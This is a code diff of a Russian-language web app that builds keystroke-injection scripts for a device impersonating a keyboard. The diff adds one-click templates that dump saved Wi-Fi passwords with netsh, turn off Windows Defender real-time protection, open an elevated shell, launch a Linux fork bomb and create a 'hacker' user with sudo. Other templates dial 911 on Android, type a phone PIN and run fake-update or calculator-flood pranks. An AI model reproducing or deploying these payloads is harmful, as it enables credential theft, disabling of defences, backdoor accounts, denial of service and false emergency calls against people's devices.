@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BT Script Builder Ultra + Analyzer</title>
+    <title>BT Script Builder MEGA</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
@@ -15,6 +15,7 @@
             --accent-cyan: #00d4ff;
             --accent-green: #00ff88;
             --accent-purple: #bd93f9;
+            --accent-red: #ff5555;
             --text-main: #ffffff;
             --text-dim: #a0aec0;
             --danger: #ff6b35;
@@ -56,14 +57,8 @@
         h1 { font-family: 'JetBrains Mono', monospace; font-size: 13px; color: var(--accent-cyan); text-shadow: 0 0 8px var(--accent-cyan); }
 
         .btn {
-            padding: 6px 8px;
-            border-radius: 4px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 10px;
-            font-weight: bold;
-            cursor: pointer;
-            border: 1px solid transparent;
-            text-transform: uppercase;
+            padding: 6px 8px; border-radius: 4px; font-family: 'JetBrains Mono', monospace;
+            font-size: 9px; font-weight: bold; cursor: pointer; border: 1px solid transparent; text-transform: uppercase;
         }
 
         .btn-gen { background: var(--accent-cyan); color: var(--bg-dark); }
@@ -71,65 +66,36 @@
         .btn-info { background: rgba(0, 255, 136, 0.1); color: var(--accent-green); border-color: var(--accent-green); }
         .btn-analyze { background: rgba(189, 147, 249, 0.1); color: var(--accent-purple); border-color: var(--accent-purple); }
 
-        .toolbar-label { font-size: 9px; color: var(--accent-cyan); padding: 5px 12px 0; font-family: 'JetBrains Mono'; text-transform: uppercase; opacity: 0.7; }
+        .toolbar-label { font-size: 8px; color: var(--accent-cyan); padding: 5px 12px 0; font-family: 'JetBrains Mono'; text-transform: uppercase; opacity: 0.6; letter-spacing: 1px; }
         
-        .toolbar-container {
-            background: var(--bg-panel);
-            border-bottom: 1px solid var(--border);
-            overflow-x: auto;
-            padding-bottom: 8px;
-            z-index: 10;
-        }
-
+        .toolbar-container { background: var(--bg-panel); border-bottom: 1px solid var(--border); overflow-x: auto; padding-bottom: 8px; z-index: 10; }
         .toolbar { display: flex; gap: 6px; padding: 5px 8px; }
 
         .cmd-btn {
-            background: rgba(0, 212, 255, 0.05);
-            border: 1px solid var(--border);
-            color: var(--accent-cyan);
-            padding: 8px 12px;
-            border-radius: 4px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 11px;
-            white-space: nowrap;
-            cursor: pointer;
+            background: rgba(0, 212, 255, 0.05); border: 1px solid var(--border); color: var(--accent-cyan);
+            padding: 8px 12px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 10px; white-space: nowrap; cursor: pointer;
         }
 
-        .tpl-btn { background: rgba(189, 147, 249, 0.1); border: 1px solid var(--accent-purple); color: var(--accent-purple); }
+        .tpl-btn { background: rgba(189, 147, 249, 0.05); border: 1px solid var(--accent-purple); color: var(--accent-purple); }
+        .tpl-btn-red { border-color: var(--accent-red); color: var(--accent-red); }
 
         .script-area { flex: 1; overflow-y: auto; padding: 12px; z-index: 5; }
-
-        .command-item {
-            background: var(--bg-panel);
-            border: 1px solid var(--border);
-            margin-bottom: 6px;
-            padding: 10px;
-            border-radius: 6px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .command-text { flex: 1; font-family: 'JetBrains Mono', monospace; font-size: 11px; }
+        .command-item { background: var(--bg-panel); border: 1px solid var(--border); margin-bottom: 6px; padding: 8px; border-radius: 6px; display: flex; align-items: center; gap: 10px; }
+        .command-text { flex: 1; font-family: 'JetBrains Mono', monospace; font-size: 10px; }
         .command-text b { color: var(--accent-cyan); }
         .drag-handle { color: var(--text-dim); font-size: 16px; padding: 0 5px; cursor: move; }
-
         .delete-btn { background: none; border: 1px solid var(--danger); color: var(--danger); width: 22px; height: 22px; border-radius: 4px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; }
 
         footer { padding: 10px; background: var(--bg-panel); border-top: 1px solid var(--border); z-index: 10; }
-
-        .cyber-select { width: 100%; background: var(--bg-dark); border: 1px solid var(--border); color: white; padding: 8px; border-radius: 4px; -webkit-appearance: none; font-size: 12px; }
+        .cyber-select { width: 100%; background: var(--bg-dark); border: 1px solid var(--border); color: white; padding: 8px; border-radius: 4px; font-size: 11px; }
 
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; align-items: center; justify-content: center; padding: 20px; }
-        .modal-content { background: var(--bg-panel); border: 1px solid var(--accent-cyan); padding: 20px; border-radius: 8px; width: 100%; max-width: 360px; max-height: 80vh; overflow-y: auto; }
-        .modal h2 { font-size: 13px; font-family: 'JetBrains Mono', monospace; color: var(--accent-cyan); margin-bottom: 12px; text-transform: uppercase; }
-
-        .cyber-textarea { width: 100%; height: 180px; background: #000; border: 1px solid var(--border); color: var(--accent-green); padding: 10px; font-family: 'JetBrains Mono'; font-size: 11px; margin-bottom: 10px; resize: none; }
+        .modal-content { background: var(--bg-panel); border: 1px solid var(--accent-cyan); padding: 15px; border-radius: 8px; width: 100%; max-width: 360px; max-height: 85vh; overflow-y: auto; }
+        .modal h2 { font-size: 12px; font-family: 'JetBrains Mono', monospace; color: var(--accent-cyan); margin-bottom: 12px; text-transform: uppercase; }
+        .cyber-textarea { width: 100%; height: 200px; background: #000; border: 1px solid var(--border); color: var(--accent-green); padding: 10px; font-family: 'JetBrains Mono'; font-size: 10px; margin-bottom: 10px; resize: none; }
         .cyber-input { width: 100%; background: var(--bg-dark); border: 1px solid var(--accent-cyan); color: white; padding: 10px; border-radius: 4px; margin-bottom: 12px; font-size: 16px; }
-
-        .analysis-text { font-size: 11px; line-height: 1.6; color: var(--text-dim); font-family: 'JetBrains Mono'; }
-        .analysis-step { margin-bottom: 8px; padding-left: 10px; border-left: 2px solid var(--accent-purple); }
-        .analysis-step b { color: var(--text-main); }
+        .analysis-text { font-size: 10px; line-height: 1.5; color: var(--text-dim); font-family: 'JetBrains Mono'; }
+        .analysis-step { margin-bottom: 6px; padding-left: 8px; border-left: 2px solid var(--accent-purple); }
     </style>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.3.2/pixi.min.js"></script>
@@ -140,7 +106,7 @@
 
     <header>
         <div class="header-top">
-            <h1>BT BUILDER <span style="color:var(--accent-green)">ULTRA</span></h1>
+            <h1>BT BUILDER <span style="color:var(--accent-green)">MEGA</span></h1>
             <div class="header-btns">
                 <button id="help-btn" class="btn btn-info">ИНФО</button>
                 <button id="analyze-btn" class="btn btn-analyze">АНАЛИЗ</button>
@@ -159,23 +125,45 @@
             <button class="cmd-btn" data-type="GUI">GUI</button>
             <button class="cmd-btn" data-type="CTRL">CTRL</button>
             <button class="cmd-btn" data-type="ALT">ALT</button>
-            <button class="cmd-btn" data-type="SHIFT">SHIFT</button>
         </div>
-        <div class="toolbar-label">Шаблоны</div>
+        
+        <div class="toolbar-label">iOS / Android</div>
         <div class="toolbar">
             <button class="cmd-btn tpl-btn" data-tpl="pin_7878">PIN 7878</button>
-            <button class="cmd-btn tpl-btn" data-tpl="win_cmd">Win CMD</button>
-            <button class="cmd-btn tpl-btn" data-tpl="mac_term">Mac Terminal</button>
-            <button class="cmd-btn tpl-btn" data-tpl="ios_screen">iOS Screenshot</button>
-            <button class="cmd-btn tpl-btn" data-tpl="android_lock">Android Lock</button>
+            <button class="cmd-btn tpl-btn" data-tpl="ios_cam">iOS Camera</button>
+            <button class="cmd-btn tpl-btn" data-tpl="ios_vol">iOS Vol Max</button>
+            <button class="cmd-btn tpl-btn" data-tpl="android_call">Android Dial</button>
+            <button class="cmd-btn tpl-btn" data-tpl="android_yt">Android YT</button>
+        </div>
+
+        <div class="toolbar-label">Windows (PC)</div>
+        <div class="toolbar">
+            <button class="cmd-btn tpl-btn" data-tpl="win_cmd">Admin CMD</button>
+            <button class="cmd-btn tpl-btn" data-tpl="win_wifi">WiFi Steal</button>
+            <button class="cmd-btn tpl-btn" data-tpl="win_def">Off Defender</button>
+            <button class="cmd-btn tpl-btn" data-tpl="win_info">Sys Info</button>
+            <button class="cmd-btn tpl-btn" data-tpl="win_msg">Notepad Msg</button>
+        </div>
+
+        <div class="toolbar-label">macOS / Linux</div>
+        <div class="toolbar">
+            <button class="cmd-btn tpl-btn" data-tpl="mac_calc">Mac Calc</button>
+            <button class="cmd-btn tpl-btn" data-tpl="mac_say">Mac Say Hello</button>
+            <button class="cmd-btn tpl-btn" data-tpl="linux_fork">Linux Bomb</button>
+            <button class="cmd-btn tpl-btn" data-tpl="linux_user">Add User</button>
+        </div>
+
+        <div class="toolbar-label">Приколы (Pranks)</div>
+        <div class="toolbar">
+            <button class="cmd-btn tpl-btn tpl-btn-red" data-tpl="prank_rick">RickRoll</button>
+            <button class="cmd-btn tpl-btn tpl-btn-red" data-tpl="prank_update">Fake Update</button>
+            <button class="cmd-btn tpl-btn tpl-btn-red" data-tpl="prank_calc">Infinite Calc</button>
         </div>
     </div>
 
     <main class="script-area">
         <div id="command-list">
-            <div id="empty-hint" style="text-align: center; color: var(--text-dim); margin-top: 50px; font-size: 11px; font-family: 'JetBrains Mono'; opacity: 0.5;">
-                [ ДОБАВЬТЕ КОМАНДЫ ]
-            </div>
+            <div id="empty-hint" style="text-align: center; color: var(--text-dim); margin-top: 50px; font-size: 11px; font-family: 'JetBrains Mono'; opacity: 0.5;">[ КОМАНДЫ ПУСТЫ ]</div>
         </div>
     </main>
 
@@ -187,30 +175,24 @@
         </select>
     </footer>
 
-    <div id="help-modal" class="modal"><div class="modal-content"><h2>Шпаргалка</h2><div id="h_body" style="font-size:11px; color:var(--text-dim); line-height:1.4;"></div><button onclick="closeModals()" class="btn btn-gen" style="width:100%; margin-top:15px;">ОК</button></div></div>
-    
-    <div id="analyze-modal" class="modal"><div class="modal-content"><h2>Анализ Скрипта</h2><div id="analysis-body" class="analysis-text"></div><button onclick="closeModals()" class="btn btn-analyze" style="width:100%; margin-top:15px;">ПОНЯТНО</button></div></div>
-
-    <div id="result-modal" class="modal"><div class="modal-content"><h2>ГОТОВЫЙ КОД</h2><textarea id="result-output" class="cyber-textarea" readonly></textarea><button id="copy-btn" class="btn btn-gen" style="width:100%;">КОПИРОВАТЬ</button><button onclick="closeModals()" class="btn btn-reset" style="width:100%; margin-top:8px;">ЗАКРЫТЬ</button></div></div>
-    
-    <div id="edit-modal" class="modal"><div class="modal-content"><h2 id="edit-modal-title">ВВОД</h2><input type="text" id="edit-input" class="cyber-input" placeholder="Значение..."><button id="save-edit-btn" class="btn btn-gen" style="width:100%;">ДОБАВИТЬ</button><button onclick="closeModals()" class="btn btn-reset" style="width:100%; margin-top:8px;">ОТМЕНА</button></div></div>
+    <div id="help-modal" class="modal"><div class="modal-content"><h2>Справка</h2><div id="h_body"></div><button onclick="closeModals()" class="btn btn-gen" style="width:100%; margin-top:15px;">ОК</button></div></div>
+    <div id="analyze-modal" class="modal"><div class="modal-content"><h2>Анализ</h2><div id="analysis-body" class="analysis-text"></div><button onclick="closeModals()" class="btn btn-analyze" style="width:100%; margin-top:15px;">ОК</button></div></div>
+    <div id="result-modal" class="modal"><div class="modal-content"><h2>Код</h2><textarea id="result-output" class="cyber-textarea" readonly></textarea><button id="copy-btn" class="btn btn-gen" style="width:100%;">КОПИРОВАТЬ</button><button onclick="closeModals()" class="btn btn-reset" style="width:100%; margin-top:8px;">ЗАКРЫТЬ</button></div></div>
+    <div id="edit-modal" class="modal"><div class="modal-content"><h2 id="edit-modal-title">ВВОД</h2><input type="text" id="edit-input" class="cyber-input"><button id="save-edit-btn" class="btn btn-gen" style="width:100%;">ДОБАВИТЬ</button><button onclick="closeModals()" class="btn btn-reset" style="width:100%; margin-top:8px;">ОТМЕНА</button></div></div>
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             let scriptCommands = [];
-            let commandIdCounter = 0;
+            let idCounter = 0;
             const commandList = document.getElementById('command-list');
             const editModal = document.getElementById('edit-modal');
             const editInput = document.getElementById('edit-input');
 
             if (typeof Sortable !== 'undefined') {
-                new Sortable(commandList, { 
-                    animation: 150, handle: '.drag-handle', 
-                    onEnd: (evt) => {
-                        const movedItem = scriptCommands.splice(evt.oldIndex, 1)[0];
-                        scriptCommands.splice(evt.newIndex, 0, movedItem);
-                    }
-                });
+                new Sortable(commandList, { animation: 150, handle: '.drag-handle', onEnd: (evt) => {
+                    const movedItem = scriptCommands.splice(evt.oldIndex, 1)[0];
+                    scriptCommands.splice(evt.newIndex, 0, movedItem);
+                }});
             }
 
             function render() {
@@ -225,40 +207,74 @@
                 scriptCommands.forEach((cmd, index) => {
                     const div = document.createElement('div');
                     div.className = 'command-item';
-                    div.innerHTML = `
-                        <span class="drag-handle">☰</span>
-                        <span class="command-text"><b>${cmd.type}</b> ${cmd.value ? ': ' + cmd.value : ''}</span>
-                        <button class="delete-btn" onclick="deleteCmd(${index})">×</button>
-                    `;
+                    div.innerHTML = `<span class="drag-handle">☰</span><span class="command-text"><b>${cmd.type}</b> ${cmd.value ? ': ' + cmd.value : ''}</span><button class="delete-btn" onclick="deleteCmd(${index})">×</button>`;
                     commandList.appendChild(div);
                 });
             }
 
-            function addCommand(type, value = null, isTemplate = false) {
-                scriptCommands.push({ id: commandIdCounter++, type, value, isTemplate });
+            function addCommand(type, value = null) {
+                scriptCommands.push({ id: idCounter++, type, value });
                 render();
             }
 
             function addTemplate(tpl) {
-                if (tpl === 'pin_7878') {
-                    addCommand('REM', 'Unlock PIN 7878', true);
-                    addCommand('STRING', ' '); addCommand('DELAY', '1000');
-                    addCommand('STRING', '7'); addCommand('DELAY', '500');
-                    addCommand('STRING', '8'); addCommand('DELAY', '500');
-                    addCommand('STRING', '7'); addCommand('DELAY', '500');
-                    addCommand('STRING', '8');
-                } else if (tpl === 'win_cmd') {
-                    addCommand('REM', 'Open Windows CMD', true);
-                    addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'cmd'); addCommand('ENTER');
-                } else if (tpl === 'mac_term') {
-                    addCommand('REM', 'Open Mac Terminal', true);
-                    addCommand('GUI', ' '); addCommand('DELAY', '300'); addCommand('STRING', 'terminal'); addCommand('ENTER');
-                } else if (tpl === 'ios_screen') {
-                    addCommand('REM', 'Take iOS Screenshot', true);
-                    addCommand('GUI', 'SHIFT'); addCommand('STRING', '3');
-                } else if (tpl === 'android_lock') {
-                    addCommand('REM', 'Lock Android Device', true);
-                    addCommand('GUI', 'L');
+                switch(tpl) {
+                    case 'pin_7878':
+                        addCommand('REM', 'Unlock PIN 7878');
+                        addCommand('STRING', ' '); addCommand('DELAY', '1000');
+                        addCommand('STRING', '7'); addCommand('DELAY', '500');
+                        addCommand('STRING', '8'); addCommand('DELAY', '500');
+                        addCommand('STRING', '7'); addCommand('DELAY', '500');
+                        addCommand('STRING', '8');
+                        break;
+                    case 'ios_cam':
+                        addCommand('GUI', 'SPACE'); addCommand('DELAY', '300'); addCommand('STRING', 'camera'); addCommand('ENTER');
+                        break;
+                    case 'ios_vol':
+                        for(let i=0; i<10; i++) { addCommand('VOLUME_UP'); }
+                        break;
+                    case 'android_call':
+                        addCommand('GUI', 'SPACE'); addCommand('DELAY', '500'); addCommand('STRING', 'tel:911'); addCommand('ENTER');
+                        break;
+                    case 'android_yt':
+                        addCommand('GUI', 'SPACE'); addCommand('DELAY', '500'); addCommand('STRING', 'youtube.com'); addCommand('ENTER');
+                        break;
+                    case 'win_cmd':
+                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'powershell Start-Process cmd -Verb runAs'); addCommand('ENTER');
+                        break;
+                    case 'win_wifi':
+                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'cmd /k netsh wlan show profile name=* key=clear'); addCommand('ENTER');
+                        break;
+                    case 'win_def':
+                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'powershell Set-MpPreference -DisableRealtimeMonitoring $true'); addCommand('ENTER');
+                        break;
+                    case 'win_info':
+                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'cmd /k systeminfo && pause'); addCommand('ENTER');
+                        break;
+                    case 'win_msg':
+                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'notepad'); addCommand('ENTER'); addCommand('DELAY', '1000'); addCommand('STRING', 'YOU HAVE BEEN HACKED BY BT BUILDER');
+                        break;
+                    case 'mac_calc':
+                        addCommand('GUI', ' '); addCommand('DELAY', '300'); addCommand('STRING', 'calculator'); addCommand('ENTER');
+                        break;
+                    case 'mac_say':
+                        addCommand('GUI', ' '); addCommand('DELAY', '300'); addCommand('STRING', 'terminal'); addCommand('ENTER'); addCommand('DELAY', '1000'); addCommand('STRING', 'say "BT Builder is here"'); addCommand('ENTER');
+                        break;
+                    case 'linux_fork':
+                        addCommand('GUI', 't'); addCommand('DELAY', '500'); addCommand('STRING', ':(){ :|:& };:'); addCommand('ENTER');
+                        break;
+                    case 'linux_user':
+                        addCommand('GUI', 't'); addCommand('DELAY', '500'); addCommand('STRING', 'sudo useradd -m hacker && sudo passwd hacker'); addCommand('ENTER');
+                        break;
+                    case 'prank_rick':
+                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'); addCommand('ENTER');
+                        break;
+                    case 'prank_update':
+                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'https://fakescreen.com/windows-10-update/'); addCommand('ENTER'); addCommand('DELAY', '500'); addCommand('F11');
+                        break;
+                    case 'prank_calc':
+                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'powershell for($i=0;$i -lt 20;$i++){start calc}'); addCommand('ENTER');
+                        break;
                 }
             }
 
@@ -278,7 +294,7 @@
 
             document.getElementById('save-edit-btn').onclick = () => {
                 const val = editInput.value.trim();
-                if(!val) return alert("Введите значение");
+                if(!val) return;
                 addCommand(document.getElementById('edit-modal-title').textContent, val);
                 closeModals();
             };
@@ -286,49 +302,36 @@
             window.deleteCmd = (index) => { scriptCommands.splice(index, 1); render(); };
             window.closeModals = () => { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); };
 
-            // ФУНКЦИЯ АНАЛИЗА
+            // АНАЛИЗАТОР
             document.getElementById('analyze-btn').onclick = () => {
-                if(scriptCommands.length === 0) return alert("Скрипт пуст");
+                if(scriptCommands.length === 0) return;
                 const body = document.getElementById('analysis-body');
                 body.innerHTML = '';
-                
                 scriptCommands.forEach((cmd, i) => {
                     let desc = "";
-                    const val = cmd.value ? cmd.value.toLowerCase() : "";
-
+                    const v = cmd.value ? cmd.value.toLowerCase() : "";
                     if (cmd.type === 'STRING') {
-                        if (val.includes('ipconfig')) desc = "Запрашивает сетевые настройки (IP, MAC, DNS).";
-                        else if (val.includes('whoami')) desc = "Узнает имя текущего пользователя.";
-                        else if (val.includes('http')) desc = "Открывает указанную веб-ссылку.";
-                        else if (val.includes('terminal') || val === 'cmd') desc = "Ввод названия приложения для запуска.";
-                        else if (cmd.isTemplate) desc = "Часть автоматизированного шаблона.";
-                        else desc = `Печатает текст: "${cmd.value}"`;
-                    } else if (cmd.type === 'DELAY') {
-                        desc = `Ожидает ${(cmd.value/1000).toFixed(1)} сек., чтобы система среагировала.`;
-                    } else if (cmd.type === 'GUI') {
-                        desc = "Нажимает системную клавишу (Win/Cmd) для меню или команд.";
-                    } else if (cmd.type === 'ENTER') {
-                        desc = "Нажимает Ввод для подтверждения действия или запуска команды.";
-                    } else if (cmd.type === 'REM') {
-                        desc = `Комментарий к блоку: ${cmd.value}`;
-                    } else {
-                        desc = `Выполняет системное нажатие клавиши ${cmd.type}.`;
-                    }
-
+                        if (v.includes('netsh wlan')) desc = "КРАЖА ПАРОЛЕЙ WI-FI: Показывает сохраненные пароли сетей.";
+                        else if (v.includes('disable-realtimemonitoring')) desc = "ВЫКЛЮЧЕНИЕ ЗАЩИТЫ: Отключает антивирус Windows Defender.";
+                        else if (v.includes('youtube.com')) desc = "БРАУЗЕР: Открывает видео или сайт.";
+                        else if (v.includes('calc')) desc = "ЗАПУСК: Открывает калькулятор (или много копий).";
+                        else if (v.includes('say ')) desc = "ГОЛОС: Заставляет компьютер произнести текст.";
+                        else if (v.includes('useradd')) desc = "СИСТЕМА: Создает нового пользователя в Linux.";
+                        else desc = `ПЕЧАТЬ: Вводит текст "${cmd.value}".`;
+                    } else if (cmd.type === 'DELAY') desc = `ПАУЗА: Ждет ${cmd.value}мс.`;
+                    else if (cmd.type === 'REM') desc = `ИНФО: ${cmd.value}`;
+                    else desc = `КЛАВИША: Нажимает ${cmd.type}.`;
+                    
                     const step = document.createElement('div');
                     step.className = 'analysis-step';
-                    step.innerHTML = `<b>Шаг ${i+1} (${cmd.type}):</b> ${desc}`;
+                    step.innerHTML = `<b>Шаг ${i+1}:</b> ${desc}`;
                     body.appendChild(step);
                 });
                 document.getElementById('analyze-modal').style.display = 'flex';
             };
 
             document.getElementById('help-btn').onclick = () => {
-                document.getElementById('h_body').innerHTML = `
-                    <b>АНАЛИЗ:</b> Расшифровывает ваш скрипт на понятный язык.<br>
-                    <b>STRING:</b> Ввод текста или команд терминала.<br>
-                    <b>DELAY:</b> Пауза для стабильности (1000 = 1 сек).
-                `;
+                document.getElementById('h_body').innerHTML = `<p style="font-size:10px; color:var(--text-dim);">Используйте вкладки для выбора шаблонов. Анализ покажет цель каждой команды.</p>`;
                 document.getElementById('help-modal').style.display = 'flex';
             };
 
@@ -344,17 +347,17 @@
             document.getElementById('copy-btn').onclick = () => {
                 document.getElementById('result-output').select();
                 document.execCommand('copy');
-                alert('Готово');
+                alert('Скопировано');
             };
 
-            // Фоновый Canvas
+            // Фон
             try {
                 const canvas = document.getElementById('background-canvas');
                 const pixiApp = new PIXI.Application({ view: canvas, resizeTo: window, backgroundAlpha: 0 });
                 const grid = new PIXI.Graphics();
                 pixiApp.stage.addChild(grid);
                 pixiApp.ticker.add(() => {
-                    grid.clear(); grid.lineStyle(1, 0x00d4ff, 0.04);
+                    grid.clear(); grid.lineStyle(1, 0x00d4ff, 0.03);
                     for(let i=0; i<window.innerWidth; i+=50) { grid.moveTo(i, 0); grid.lineTo(i, window.innerHeight); }
                     for(let i=0; i<window.innerHeight; i+=50) { grid.moveTo(0, i); grid.lineTo(window.innerWidth, i); }
                 });
